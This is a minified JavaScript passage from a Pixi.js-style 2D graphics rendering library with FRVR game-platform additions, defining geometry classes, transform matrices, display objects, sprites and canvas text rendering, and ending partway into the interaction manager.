function getRenderer() {
    var e = {
        frvrTextureMemoryUsage: 0,
        frvrGLErrors: {
            NO_ERROR: 0,
            OUT_OF_MEMORY: 0,
            INVALID_ENUM: 0,
            INVALID_VALUE: 0,
            INVALID_OPERATION: 0,
            INVALID_FRAMEBUFFER_OPERATION: 0,
            CONTEXT_LOST_WEBGL: 0,
            TOTAL_ERRORS: 0
        },
        frvrErrorStats: function() {
            var t = "";
            for (name in e.frvrGLErrors) {
                var i = e.frvrGLErrors[name];
                t += name + ": " + i + "\n"
            }
            return t
        },
        WEBGL_RENDERER: 0,
        CANVAS_RENDERER: 1,
        VERSION: "v2.2.3FRVR",
        blendModes: {
            NORMAL: 0,
            ADD: 1,
            MULTIPLY: 2,
            SCREEN: 3
        },
        scaleModes: {
            DEFAULT: 0,
            LINEAR: 0,
            NEAREST: 1
        },
        _UID: 0
    };
    return "undefined" != typeof Float32Array ? (e.Float32Array = Float32Array, e.Uint16Array = Uint16Array, e.Uint32Array = Uint32Array, e.ArrayBuffer = ArrayBuffer) : (e.Float32Array = Array, e.Uint16Array = Array), e.INTERACTION_FREQUENCY = 30, e.AUTO_PREVENT_DEFAULT = !0, e.PI_2 = 2 * Math.PI, e.RAD_TO_DEG = 180 / Math.PI, e.DEG_TO_RAD = Math.PI / 180, e.defaultRenderOptions = {
        view: null,
        transparent: !1,
        antialias: !1,
        preserveDrawingBuffer: !1,
        clearBeforeRender: !0,
        autoResize: !1
    }, e.Point = function(e, t) {
        this.x = e || 0, this.y = t || 0
    }, e.Point.prototype.clone = function() {
        return new e.Point(this.x, this.y)
    }, e.Point.prototype.set = function(e, t) {
        this.x = e || 0, this.y = t || (0 !== t ? this.x : 0)
    }, e.Point.prototype.constructor = e.Point, e.Rectangle = function(e, t, i, n) {
        this.x = e || 0, this.y = t || 0, this.width = i || 0, this.height = n || 0
    }, e.Rectangle.prototype.clone = function() {
        return new e.Rectangle(this.x, this.y, this.width, this.height)
    }, e.Rectangle.prototype.contains = function(e, t) {
        if (this.width <= 0 || this.height <= 0) return !1;
        var i = this.x;
        if (e >= i && e <= i + this.width) {
            var n = this.y;
            if (t >= n && t <= n + this.height) return !0
        }
        return !1
    }, e.Rectangle.prototype.constructor = e.Rectangle, e.EmptyRectangle = new e.Rectangle(0, 0, 0, 0), e.Polygon = function(t) {
        if (t instanceof Array || (t = Array.prototype.slice.call(arguments)), t[0] instanceof e.Point) {
            for (var i = [], n = 0, r = t.length; n < r; n++) i.push(t[n].x, t[n].y);
            t = i
        }
        this.closed = !0, this.points = t
    }, e.Polygon.prototype.clone = function() {
        var t = this.points.slice();
        return new e.Polygon(t)
    }, e.Polygon.prototype.contains = function(e, t) {
        for (var i = !1, n = this.points.length / 2, r = 0, o = n - 1; r < n; o = r++) {
            var a = this.points[2 * r],
                s = this.points[2 * r + 1],
                l = this.points[2 * o],
                h = this.points[2 * o + 1];
            s > t != h > t && e < (l - a) * (t - s) / (h - s) + a && (i = !i)
        }
        return i
    }, e.Polygon.prototype.constructor = e.Polygon, e.Circle = function(e, t, i) {
        this.x = e || 0, this.y = t || 0, this.radius = i || 0
    }, e.Circle.prototype.clone = function() {
        return new e.Circle(this.x, this.y, this.radius)
    }, e.Circle.prototype.contains = function(e, t) {
        if (this.radius <= 0) return !1;
        var i = this.x - e,
            n = this.y - t;
        return (i *= i) + (n *= n) <= this.radius * this.radius
    }, e.Circle.prototype.getBounds = function() {
        return new e.Rectangle(this.x - this.radius, this.y - this.radius, 2 * this.radius, 2 * this.radius)
    }, e.Circle.prototype.constructor = e.Circle, e.Ellipse = function(e, t, i, n) {
        this.x = e || 0, this.y = t || 0, this.width = i || 0, this.height = n || 0
    }, e.Ellipse.prototype.clone = function() {
        return new e.Ellipse(this.x, this.y, this.width, this.height)
    }, e.Ellipse.prototype.contains = function(e, t) {
        if (this.width <= 0 || this.height <= 0) return !1;
        var i = (e - this.x) / this.width,
            n = (t - this.y) / this.height;
        return (i *= i) + (n *= n) <= 1
    }, e.Ellipse.prototype.getBounds = function() {
        return new e.Rectangle(this.x - this.width, this.y - this.height, this.width, this.height)
    }, e.Ellipse.prototype.constructor = e.Ellipse, e.RoundedRectangle = function(e, t, i, n, r) {
        this.x = e || 0, this.y = t || 0, this.width = i || 0, this.height = n || 0, this.radius = r || 20
    }, e.RoundedRectangle.prototype.clone = function() {
        return new e.RoundedRectangle(this.x, this.y, this.width, this.height, this.radius)
    }, e.RoundedRectangle.prototype.contains = function(e, t) {
        if (this.width <= 0 || this.height <= 0) return !1;
        var i = this.x;
        if (e >= i && e <= i + this.width) {
            var n = this.y;
            if (t >= n && t <= n + this.height) return !0
        }
        return !1
    }, e.RoundedRectangle.prototype.constructor = e.RoundedRectangle, e.Matrix = function() {
        this.a = 1, this.b = 0, this.c = 0, this.d = 1, this.tx = 0, this.ty = 0
    }, e.Matrix.prototype.fromArray = function(e) {
        this.a = e[0], this.b = e[1], this.c = e[3], this.d = e[4], this.tx = e[2], this.ty = e[5]
    }, e.Matrix.prototype.toArray = function(t) {
        this.array || (this.array = new e.Float32Array(9));
        var i = this.array;
        return t ? (i[0] = this.a, i[1] = this.b, i[2] = 0, i[3] = this.c, i[4] = this.d, i[5] = 0, i[6] = this.tx, i[7] = this.ty, i[8] = 1) : (i[0] = this.a, i[1] = this.c, i[2] = this.tx, i[3] = this.b, i[4] = this.d, i[5] = this.ty, i[6] = 0, i[7] = 0, i[8] = 1), i
    }, e.Matrix.prototype.apply = function(t, i) {
        return (i = i || new e.Point).x = this.a * t.x + this.c * t.y + this.tx, i.y = this.b * t.x + this.d * t.y + this.ty, i
    }, e.Matrix.prototype.applyInverse = function(t, i) {
        i = i || new e.Point;
        var n = 1 / (this.a * this.d + this.c * -this.b);
        return i.x = this.d * n * t.x + -this.c * n * t.y + (this.ty * this.c - this.tx * this.d) * n, i.y = this.a * n * t.y + -this.b * n * t.x + (-this.ty * this.a + this.tx * this.b) * n, i
    }, e.Matrix.prototype.translate = function(e, t) {
        return this.tx += e, this.ty += t, this
    }, e.Matrix.prototype.scale = function(e, t) {
        return this.a *= e, this.d *= t, this.c *= e, this.b *= t, this.tx *= e, this.ty *= t, this
    }, e.Matrix.prototype.rotate = function(e) {
        var t = Math.cos(e),
            i = Math.sin(e),
            n = this.a,
            r = this.c,
            o = this.tx;
        return this.a = n * t - this.b * i, this.b = n * i + this.b * t, this.c = r * t - this.d * i, this.d = r * i + this.d * t, this.tx = o * t - this.ty * i, this.ty = o * i + this.ty * t, this
    }, e.Matrix.prototype.append = function(e) {
        var t = this.a,
            i = this.b,
            n = this.c,
            r = this.d;
        return this.a = e.a * t + e.b * n, this.b = e.a * i + e.b * r, this.c = e.c * t + e.d * n, this.d = e.c * i + e.d * r, this.tx = e.tx * t + e.ty * n + this.tx, this.ty = e.tx * i + e.ty * r + this.ty, this
    }, e.Matrix.prototype.identity = function() {
        return this.a = 1, this.b = 0, this.c = 0, this.d = 1, this.tx = 0, this.ty = 0, this
    }, e.identityMatrix = new e.Matrix, e.DisplayObject = function() {
        this.position = new e.Point, this.scale = new e.Point(1, 1), this.pivot = new e.Point(0, 0), this.rotation = 0, this.alpha = 1, this.visible = !0, this.hitArea = null, this.buttonMode = !1, this.renderable = !1, this.parent = null, this.stage = null, this.worldAlpha = 1, this._interactive = !1, this.defaultCursor = "pointer", this.worldTransform = new e.Matrix, this._sr = 0, this._cr = 1, this.filterArea = null, this._bounds = new e.Rectangle(0, 0, 1, 1), this._currentBounds = null, this._mask = null, this._cacheIsDirty = !1
    }, e.DisplayObject.prototype.constructor = e.DisplayObject, Object.defineProperty(e.DisplayObject.prototype, "interactive", {
        get: function() {
            return this._interactive
        },
        set: function(e) {
            this._interactive = e, this.stage && (this.stage.dirty = !0)
        }
    }), Object.defineProperty(e.DisplayObject.prototype, "worldVisible", {
        get: function() {
            var e = this;
            do {
                if (!e.visible) return !1;
                e = e.parent
            } while (e);
            return !0
        }
    }), Object.defineProperty(e.DisplayObject.prototype, "mask", {
        get: function() {
            return this._mask
        },
        set: function(e) {
            this._mask && (this._mask.isMask = !1), this._mask = e, this._mask && (this._mask.isMask = !0)
        }
    }), Object.defineProperty(e.DisplayObject.prototype, "filters", {
        get: function() {
            return this._filters
        },
        set: function(e) {
            if (e) {
                for (var t = [], i = 0; i < e.length; i++)
                    for (var n = e[i].passes, r = 0; r < n.length; r++) t.push(n[r]);
                this._filterBlock = {
                    target: this,
                    filterPasses: t
                }
            }
            this._filters = e
        }
    }), e.DisplayObject.prototype.updateTransform = function(t, i, n, r, o, a, s, l) {
        t = this.parent.worldTransform, i = this.worldTransform, this.rotation % e.PI_2 != 0 ? (this.rotation !== this.rotationCache && (this.rotationCache = this.rotation, this._sr = Math.sin(this.rotation), this._cr = Math.cos(this.rotation)), n = this._cr * this.scale.x, r = this._sr * this.scale.x, o = -this._sr * this.scale.y, a = this._cr * this.scale.y, s = this.position.x, l = this.position.y, (this.pivot.x || this.pivot.y) && (s -= this.pivot.x * n + this.pivot.y * o, l -= this.pivot.x * r + this.pivot.y * a), i.a = n * t.a + r * t.c, i.b = n * t.b + r * t.d, i.c = o * t.a + a * t.c, i.d = o * t.b + a * t.d, i.tx = s * t.a + l * t.c + t.tx, i.ty = s * t.b + l * t.d + t.ty) : (n = this.scale.x, a = this.scale.y, s = this.position.x - this.pivot.x * n, l = this.position.y - this.pivot.y * a, i.a = n * t.a, i.b = n * t.b, i.c = a * t.c, i.d = a * t.d, i.tx = s * t.a + l * t.c + t.tx, i.ty = s * t.b + l * t.d + t.ty), this.worldAlpha = this.alpha * this.parent.worldAlpha
    }, e.DisplayObject.prototype.displayObjectUpdateTransform = e.DisplayObject.prototype.updateTransform, e.DisplayObject.prototype.getBounds = function(t) {
        return t = t, e.EmptyRectangle
    }, e.DisplayObject.prototype.getLocalBounds = function() {
        return this.getBounds(e.identityMatrix)
    }, e.DisplayObject.prototype.setStageReference = function(e) {
        this.stage = e, this._interactive && (this.stage.dirty = !0)
    }, e.DisplayObject.prototype.toGlobal = function(e) {
        return this.displayObjectUpdateTransform(), this.worldTransform.apply(e)
    }, e.DisplayObject.prototype.toGlobalSize = function(e) {
        return this.displayObjectUpdateTransform(), new Point(e.x * this.worldTransform.a, e.y * this.worldTransform.d)
    }, e.DisplayObject.prototype.toLocalSize = function(e, t) {
        return t && (e = t.toGlobal(e)), this.displayObjectUpdateTransform(), new Point(e.x / this.worldTransform.a, e.y / this.worldTransform.d)
    }, e.DisplayObject.prototype.toLocal = function(e, t) {
        return t && (e = t.toGlobal(e)), this.displayObjectUpdateTransform(), this.worldTransform.applyInverse(e)
    }, e.DisplayObject.prototype._renderWebGL = function(e) {}, e.DisplayObject.prototype._renderCanvas = function(e) {}, e.DisplayObject._tempMatrix = new e.Matrix, Object.defineProperty(e.DisplayObject.prototype, "x", {
        get: function() {
            return this.position.x
        },
        set: function(e) {
            this.position.x = e
        }
    }), Object.defineProperty(e.DisplayObject.prototype, "y", {
        get: function() {
            return this.position.y
        },
        set: function(e) {
            this.position.y = e
        }
    }), e.DisplayObjectContainer = function() {
        e.DisplayObject.call(this), this.children = []
    }, e.DisplayObjectContainer.prototype = Object.create(e.DisplayObject.prototype), e.DisplayObjectContainer.prototype.constructor = e.DisplayObjectContainer, Object.defineProperty(e.DisplayObjectContainer.prototype, "width", {
        get: function() {
            return this.scale.x * this.getLocalBounds().width
        },
        set: function(e) {
            var t = this.getLocalBounds().width;
            this.scale.x = 0 !== t ? e / t : 1, this._width = e
        }
    }), Object.defineProperty(e.DisplayObjectContainer.prototype, "height", {
        get: function() {
            return this.scale.y * this.getLocalBounds().height
        },
        set: function(e) {
            var t = this.getLocalBounds().height;
            this.scale.y = 0 !== t ? e / t : 1, this._height = e
        }
    }), e.DisplayObjectContainer.prototype.addChild = function(e) {
        return window.dirtyOnce = !0, this.addChildAt(e, this.children.length)
    }, e.DisplayObjectContainer.prototype.addChildAt = function(e, t) {
        if (t >= 0 && t <= this.children.length) return window.dirtyOnce = !0, window.Host && Host.Localize.UpdateChildren(e), e.parent && e.parent.removeChild(e), e.parent = this, this.children.splice(t, 0, e), this.stage && e.setStageReference(this.stage), e;
        throw new Error(e + "addChildAt: The index " + t + " supplied is out of bounds " + this.children.length)
    }, e.DisplayObjectContainer.prototype.getChildIndex = function(e) {
        var t = this.children.indexOf(e);
        if (-1 === t) throw new Error("The supplied DisplayObject must be a child of the caller");
        return t
    }, e.DisplayObjectContainer.prototype.setChildIndex = function(e, t) {
        if (t < 0 || t >= this.children.length) throw new Error("The supplied index is out of bounds");
        window.dirtyOnce = !0;
        var i = this.getChildIndex(e);
        this.children.splice(i, 1), this.children.splice(t, 0, e)
    }, e.DisplayObjectContainer.prototype.getChildAt = function(e) {
        if (e < 0 || e >= this.children.length) throw new Error("getChildAt: Supplied index " + e + " does not exist in the child list, or the supplied DisplayObject must be a child of the caller");
        return this.children[e]
    }, e.DisplayObjectContainer.prototype.removeChild = function(e) {
        var t = this.children.indexOf(e);
        if (-1 !== t) return this.removeChildAt(t)
    }, e.DisplayObjectContainer.prototype.removeChildAt = function(e) {
        var t = this.getChildAt(e);
        return this.stage && t.removeStageReference(), window.dirtyOnce = !0, t.parent = void 0, this.children.splice(e, 1), t
    }, e.DisplayObjectContainer.prototype.updateTransform = function() {
        if (this.visible) {
            this.displayObjectUpdateTransform();
            for (var e = 0, t = this.children.length; e < t; e++) this.children[e].updateTransform()
        }
    }, e.DisplayObjectContainer.prototype.displayObjectContainerUpdateTransform = e.DisplayObjectContainer.prototype.updateTransform, e.DisplayObjectContainer.prototype.getBounds = function() {
        if (0 === this.children.length) return e.EmptyRectangle;
        for (var t, i, n, r = 1 / 0, o = 1 / 0, a = -1 / 0, s = -1 / 0, l = !1, h = 0, d = this.children.length; h < d; h++) {
            this.children[h].visible && (l = !0, r = r < (t = this.children[h].getBounds()).x ? r : t.x, o = o < t.y ? o : t.y, a = a > (i = t.width + t.x) ? a : i, s = s > (n = t.height + t.y) ? s : n)
        }
        if (!l) return e.EmptyRectangle;
        var c = this._bounds;
        return c.x = r, c.y = o, c.width = a - r, c.height = s - o, c
    }, e.DisplayObjectContainer.prototype.getLocalBounds = function() {
        var t = this.worldTransform;
        this.worldTransform = e.identityMatrix;
        for (var i = 0, n = this.children.length; i < n; i++) this.children[i].updateTransform();
        var r = this.getBounds();
        return this.worldTransform = t, r
    }, e.DisplayObjectContainer.prototype.setStageReference = function(e) {
        this.stage = e, this._interactive && (this.stage.dirty = !0);
        for (var t = 0, i = this.children.length; t < i; t++) {
            this.children[t].setStageReference(e)
        }
    }, e.DisplayObjectContainer.prototype.removeStageReference = function() {
        for (var e = 0, t = this.children.length; e < t; e++) {
            this.children[e].removeStageReference()
        }
        this._interactive && (this.stage.dirty = !0), this.stage = null
    }, e.DisplayObjectContainer.prototype._renderWebGL = function(e) {
        var t, i;
        if (this.visible && !(this.alpha <= 0))
            if (this._mask || this._filters) {
                for (this._mask && (e.spriteBatch.stop(), e.maskManager.pushMask(this.mask, e), e.spriteBatch.start()), t = 0, i = this.children.length; t < i; t++) this.children[t]._renderWebGL(e);
                e.spriteBatch.stop(), this._mask && e.maskManager.popMask(this._mask, e), e.spriteBatch.start()
            } else
                for (t = 0, i = this.children.length; t < i; t++) this.children[t]._renderWebGL(e)
    }, e.DisplayObjectContainer.prototype._renderCanvas = function(e) {
        if (!1 !== this.visible && 0 !== this.alpha) {
            this._mask && e.maskManager.pushMask(this._mask, e);
            for (var t = 0, i = this.children.length; t < i; t++) {
                this.children[t]._renderCanvas(e)
            }
            this._mask && e.maskManager.popMask(e)
        }
    }, e.Sprite = function(t) {
        e.DisplayObjectContainer.call(this), this.anchor = new e.Point, this.texture = t || e.Texture.emptyTexture, this._width = 0, this._height = 0, this.tint = 16777215, this.blendMode = e.blendModes.NORMAL, this.shader = null, this.texture.baseTexture.hasLoaded ? this.onTextureUpdate() : this.texture.onPixi("update", this.onTextureUpdate.bind(this)), this.renderable = !0
    }, e.Sprite.prototype = Object.create(e.DisplayObjectContainer.prototype), e.Sprite.prototype.constructor = e.Sprite, Object.defineProperty(e.Sprite.prototype, "width", {
        get: function() {
            return this.scale.x * this.texture.frame.width
        },
        set: function(e) {
            this.scale.x = e / this.texture.frame.width, this._width = e
        }
    }), Object.defineProperty(e.Sprite.prototype, "height", {
        get: function() {
            return this.scale.y * this.texture.frame.height
        },
        set: function(e) {
            this.scale.y = e / this.texture.frame.height, this._height = e
        }
    }), e.Sprite.prototype.setTexture = function(e) {
        this.texture = e, this.cachedTint = 16777215
    }, e.Sprite.prototype.onTextureUpdate = function() {
        this._width && (this.scale.x = this._width / this.texture.frame.width), this._height && (this.scale.y = this._height / this.texture.frame.height)
    }, e.Sprite.prototype.getBounds = function(e) {
        var t = this.texture.frame.width,
            i = this.texture.frame.height;
        !this.texture.baseTexture.hasLoaded && this.image && this.image.width && (t = this.image.width, i = this.image.height);
        var n = t * (1 - this.anchor.x),
            r = t * -this.anchor.x,
            o = i * (1 - this.anchor.y),
            a = i * -this.anchor.y,
            s = e || this.worldTransform,
            l = s.a,
            h = s.b,
            d = s.c,
            c = s.d,
            u = s.tx,
            f = s.ty,
            p = -1 / 0,
            g = -1 / 0,
            v = 1 / 0,
            m = 1 / 0;
        if (0 === h && 0 === d) l < 0 && (l *= -1), c < 0 && (c *= -1), v = l * r + u, p = l * n + u, m = c * a + f, g = c * o + f;
        else {
            var y = l * r + d * a + u,
                w = c * a + h * r + f,
                S = l * n + d * a + u,
                x = c * a + h * n + f,
                b = l * n + d * o + u,
                _ = c * o + h * n + f,
                T = l * r + d * o + u,
                C = c * o + h * r + f;
            v = T < (v = b < (v = S < (v = y < v ? y : v) ? S : v) ? b : v) ? T : v, m = C < (m = _ < (m = x < (m = w < m ? w : m) ? x : m) ? _ : m) ? C : m, p = T > (p = b > (p = S > (p = y > p ? y : p) ? S : p) ? b : p) ? T : p, g = C > (g = _ > (g = x > (g = w > g ? w : g) ? x : g) ? _ : g) ? C : g
        }
        var R = this._bounds;
        return R.x = v, R.width = p - v, R.y = m, R.height = g - m, this._currentBounds = R, R
    }, e.Sprite.prototype._renderWebGL = function(e) {
        var t, i;
        if (this.visible && !(this.alpha <= 0))
            if (this._mask || this._filters) {
                var n = e.spriteBatch;
                for (this._filters && (n.flush(), e.filterManager.pushFilter(this._filterBlock)), this._mask && (n.stop(), e.maskManager.pushMask(this.mask, e), n.start()), n.render(this), t = 0, i = this.children.length; t < i; t++) this.children[t]._renderWebGL(e);
                n.stop(), this._mask && e.maskManager.popMask(this._mask, e), this._filters && e.filterManager.popFilter(), n.start()
            } else
                for (e.spriteBatch.render(this), t = 0, i = this.children.length; t < i; t++) this.children[t]._renderWebGL(e)
    }, e.Sprite.prototype._renderCanvas = function(t) {
        if (!(!1 === this.visible || 0 === this.alpha || this.texture.crop.width <= 0 || this.texture.crop.height <= 0)) {
            if (this.blendMode !== t.currentBlendMode && (t.currentBlendMode = this.blendMode, t.context.globalCompositeOperation = e.blendModesCanvas[t.currentBlendMode]), this._mask && t.maskManager.pushMask(this._mask, t), this.texture.valid) {
                t.context.globalAlpha = this.worldAlpha, t.smoothProperty && t.scaleMode !== this.texture.baseTexture.scaleMode && (t.scaleMode = this.texture.baseTexture.scaleMode, t.context[t.smoothProperty] = t.scaleMode === e.scaleModes.LINEAR);
                var i = this.texture.trim ? this.texture.trim.x - this.anchor.x * this.texture.trim.width : this.anchor.x * -this.texture.frame.width,
                    n = this.texture.trim ? this.texture.trim.y - this.anchor.y * this.texture.trim.height : this.anchor.y * -this.texture.frame.height;
                if (t.context.setTransform(this.worldTransform.a, this.worldTransform.b, this.worldTransform.c, this.worldTransform.d, 0 | this.worldTransform.tx, 0 | this.worldTransform.ty), i |= 0, n |= 0, 16777215 !== this.tint) {
                    this.cachedTint !== this.tint && (this.cachedTint = this.tint, this.tintedTexture = e.CanvasTinter.getTintedTexture(this, this.tint));
                    var r = this.texture.resolution || 1;
                    t.context.drawImage(this.tintedTexture, 0, 0, this.texture.crop.width * r, this.texture.crop.height * r, i, n, this.texture.crop.width, this.texture.crop.height)
                } else {
                    r = this.texture.resolution || 1;
                    t.context.drawImage(this.texture.baseTexture.source, this.texture.crop.x * r, this.texture.crop.y * r, this.texture.crop.width * r, this.texture.crop.height * r, i, n, this.texture.crop.width, this.texture.crop.height)
                }
            }
            for (var o = 0, a = this.children.length; o < a; o++) this.children[o]._renderCanvas(t);
            this._mask && t.maskManager.popMask(t)
        }
    }, e.Sprite.fromFrame = function(t) {
        var i = e.TextureCache[t];
        if (!i) throw new Error('The frameId "' + t + '" does not exist in the texture cache' + this);
        return new e.Sprite(i)
    }, e.Sprite.fromImage = function(t, i, n) {
        var r = e.Texture.fromImage(t, i, n);
        return new e.Sprite(r)
    }, e.SpriteBatch = function() {
        e.DisplayObjectContainer.call(this), this.ready = !1
    }, e.SpriteBatch.prototype = Object.create(e.DisplayObjectContainer.prototype), e.SpriteBatch.prototype.constructor = e.SpriteBatch, e.SpriteBatch.prototype.initWebGL = function(t) {
        this.fastSpriteBatch = new e.WebGLFastSpriteBatch(t), this.ready = !0
    }, e.SpriteBatch.prototype.updateTransform = function() {
        this.displayObjectUpdateTransform()
    }, e.SpriteBatch.prototype._renderWebGL = function(e) {
        !this.visible || this.alpha <= 0 || !this.children.length || (this.ready || this.initWebGL(e.gl), e.spriteBatch.stop(), e.shaderManager.setShader(e.shaderManager.fastShader), this.fastSpriteBatch.begin(this, e), this.fastSpriteBatch.render(this), e.spriteBatch.start())
    }, e.SpriteBatch.prototype._renderCanvas = function(e) {
        if (this.visible && !(this.alpha <= 0) && this.children.length) {
            var t = e.context;
            t.globalAlpha = this.worldAlpha, this.displayObjectUpdateTransform();
            for (var i = this.worldTransform, n = !0, r = 0; r < this.children.length; r++) {
                var o = this.children[r];
                if (o.visible) {
                    var a = o.texture,
                        s = a.frame;
                    if (t.globalAlpha = this.worldAlpha * o.alpha, o.rotation % (2 * Math.PI) == 0) n && (t.setTransform(i.a, i.b, i.c, i.d, i.tx, i.ty), n = !1), t.drawImage(a.baseTexture.source, s.x, s.y, s.width, s.height, o.anchor.x * (-s.width * o.scale.x) + o.position.x + .5 | 0, o.anchor.y * (-s.height * o.scale.y) + o.position.y + .5 | 0, s.width * o.scale.x, s.height * o.scale.y);
                    else {
                        n || (n = !0), o.displayObjectUpdateTransform();
                        var l = o.worldTransform;
                        t.setTransform(l.a, l.b, l.c, l.d, 0 | l.tx, 0 | l.ty), t.drawImage(a.baseTexture.source, s.x, s.y, s.width, s.height, o.anchor.x * -s.width + .5 | 0, o.anchor.y * -s.height + .5 | 0, s.width, s.height)
                    }
                }
            }
        }
    }, e.Text = function(t, i) {
        this.canvas = document.createElement("canvas"), this.context = this.canvas.getContext("2d"), e.Sprite.call(this, e.Texture.fromCanvas(this.canvas)), this.setText(t), this.setStyle(i)
    }, e.Text.prototype = Object.create(e.Sprite.prototype), e.Text.prototype.constructor = e.Text, Object.defineProperty(e.Text.prototype, "width", {
        get: function() {
            return this.dirty && (this.updateText(), this.dirty = !1), this.scale.x * this.texture.frame.width
        },
        set: function(e) {
            this.scale.x = e / this.texture.frame.width, this._width = e
        }
    }), Object.defineProperty(e.Text.prototype, "height", {
        get: function() {
            return this.dirty && (this.updateText(), this.dirty = !1), this.scale.y * this.texture.frame.height
        },
        set: function(e) {
            this.scale.y = e / this.texture.frame.height, this._height = e
        }
    }), e.Text.prototype.setStyle = function(e) {
        (e = e || {}).font = e.font || "bold 20pt Arial", e.fill = e.fill || "black", e.align = e.align || "left", e.stroke = e.stroke || "black", e.strokeThickness = e.strokeThickness || 0, e.wordWrap = e.wordWrap || !1, e.wordWrapWidth = e.wordWrapWidth || 100, e.dropShadow = e.dropShadow || !1, e.dropShadowAngle = e.dropShadowAngle || Math.PI / 6, e.dropShadowDistance = e.dropShadowDistance || 4, e.dropShadowColor = e.dropShadowColor || "black", this.style = e, this.dirty = !0
    }, e.Text.prototype.setText = function(e) {
        this.text != e.toString() && (this.text = e.toString() || " ", this.dirty = !0, window.dirtyOnce = !0)
    }, e.Text.prototype.updateText = function() {
        this.context.font = this.style._font || this.style.font;
        var e = this.text.toString();
        this.style.wordWrap && (e = this.wordWrap(this.text));
        for (var t = e ? e.split(/(?:\r\n|\r|\n)/) : [], i = [], n = 0, r = this.determineFontProperties(this.style._font || this.style.font), o = 0; o < t.length; o++) {
            var a = this.context.measureText(t[o]).width;
            i[o] = a, n = Math.max(n, a)
        }
        var s = n + this.style.strokeThickness;
        this.style.dropShadow && (s += this.style.dropShadowDistance), this.canvas.width = Math.max(s + this.context.lineWidth, 1);
        var l, h, d = r.fontSize + this.style.strokeThickness,
            c = d * t.length;
        if (this.style.dropShadow && (c += this.style.dropShadowDistance), this.canvas.height = Math.max(c, 1), this.context.scale(1, 1), this.context.font = this.style._font || this.style.font, this.context.strokeStyle = this.style.stroke, this.context.lineWidth = this.style.strokeThickness, this.context.textBaseline = "alphabetic", this.style.dropShadow) {
            this.context.fillStyle = this.style.dropShadowColor;
            var u = Math.sin(this.style.dropShadowAngle) * this.style.dropShadowDistance,
                f = Math.cos(this.style.dropShadowAngle) * this.style.dropShadowDistance;
            for (o = 0; o < t.length; o++) l = this.style.strokeThickness / 2, h = this.style.strokeThickness / 2 + o * d + r.ascent, "right" === this.style.align ? l += n - i[o] : "center" === this.style.align && (l += (n - i[o]) / 2), this.style.fill && this.context.fillText(t[o], l + u, h + f)
        }
        for (this.context.fillStyle = this.style.fill, o = 0; o < t.length; o++) l = this.style.strokeThickness / 2, h = this.style.strokeThickness / 2 + o * d + r.ascent, "right" === this.style.align ? l += n - i[o] : "center" === this.style.align && (l += (n - i[o]) / 2), this.style.stroke && this.style.strokeThickness && this.context.strokeText(t[o], l, h), this.style.fill && this.context.fillText(t[o], l, h);
        this.updateTexture()
    }, e.Text.prototype.updateTexture = function() {
        try {
            void 0 !== this._lastSize && (e.frvrTextureMemoryUsage -= 4 * this._lastSize.w * this._lastSize.h)
        } catch (e) {}
        this.texture.baseTexture.width = this.canvas.width, this.texture.baseTexture.height = this.canvas.height, this.texture.crop.width = this.texture.frame.width = this.canvas.width, this.texture.crop.height = this.texture.frame.height = this.canvas.height, this._width = this.canvas.width, this._height = this.canvas.height;
        try {
            e.frvrTextureMemoryUsage += 4 * this.texture.baseTexture.width * this.texture.baseTexture.height, this._lastSize = {
                w: this.texture.baseTexture.width,
                h: this.texture.baseTexture.height
            }
        } catch (e) {}
        this.texture.baseTexture.dirty(), this.texture.tintCache = []
    }, e.Text.prototype._renderWebGL = function(t) {
        this.dirty && (this.updateText(), this.dirty = !1), e.Sprite.prototype._renderWebGL.call(this, t)
    }, e.Text.prototype._renderCanvas = function(t) {
        this.dirty && (this.updateText(), this.dirty = !1), e.Sprite.prototype._renderCanvas.call(this, t)
    }, e.Text.prototype.determineFontProperties = function(t) {
        var i = e.Text.fontPropertiesCache[t];
        if (!i) {
            i = {};
            var n = e.Text.fontPropertiesCanvas,
                r = e.Text.fontPropertiesContext;
            r.font = t;
            var o = Math.max(Math.ceil(r.measureText("|MÉq").width), 1),
                a = Math.ceil(r.measureText("M").width),
                s = Math.max(2 * a, 1);
            a = 1.4 * a | 0, n.width = o, n.height = s, r.fillStyle = "#ffffff", r.fillRect(0, 0, o, s), r.font = t, r.textBaseline = "alphabetic", r.fillStyle = "#888888", r.fillText("|MÉq", 0, a);
            var l, h, d = r.getImageData(0, 0, o, s).data,
                c = d.length,
                u = 4 * o,
                f = 0,
                p = !1;
            for (l = 0; l < a; l++) {
                for (h = 0; h < u; h += 4)
                    if (255 !== d[f + h]) {
                        p = !0;
                        break
                    }
                if (p) break;
                f += u
            }
            for (i.ascent = a - l, f = c - u, p = !1, l = s; l > a; l--) {
                for (h = 0; h < u; h += 4)
                    if (255 !== d[f + h]) {
                        p = !0;
                        break
                    }
                if (p) break;
                f -= u
            }
            i.descent = l - a, i.fontSize = i.ascent + i.descent, e.Text.fontPropertiesCache[t] = i
        }
        return i
    }, e.Text.prototype.wordWrap = function(e) {
        for (var t = "", i = e.split("\n"), n = 0; n < i.length; n++) {
            for (var r = this.style.wordWrapWidth, o = i[n].split(" "), a = 0; a < o.length; a++) {
                var s = this.context.measureText(o[a]).width,
                    l = s + this.context.measureText(" ").width;
                0 === a || l > r ? (a > 0 && (t += "\n"), t += o[a], r = this.style.wordWrapWidth - s) : (r -= l, t += " " + o[a])
            }
            n < i.length - 1 && (t += "\n")
        }
        return t
    }, e.Text.prototype.getBounds = function(t) {
        return this.dirty && (this.updateText(), this.dirty = !1), e.Sprite.prototype.getBounds.call(this, t)
    }, e.Text.prototype.destroy = function(e) {
        this.context = null, this.canvas = null, this.texture.destroy(void 0 === e || e)
    }, e.Text.fontPropertiesCache = {}, e.Text.fontPropertiesCanvas = document.createElement("canvas"), e.Text.fontPropertiesContext = e.Text.fontPropertiesCanvas.getContext("2d"), e.InteractionData = function() {
        this.global = new e.Point, this.target = null, this.originalEvent = null
    }, e.InteractionData.prototype.getLocalPosition = function(t, i) {
        var n = t.worldTransform,
            r = this.global,
            o = n.a,
            a = n.c,
            s = n.tx,
            l = n.b,
            h = n.d,
            d = n.ty,
            c = 1 / (o * h + a * -l);
        return (i = i || new e.Point).x = h * c * r.x + -a * c * r.y + (d * a - s * h) * c, i.y = o * c * r.y + -l * c * r.x + (-d * o + s * l) * c, i
    }, e.InteractionData.prototype.constructor = e.InteractionData, e.InteractionManager = function(t) {
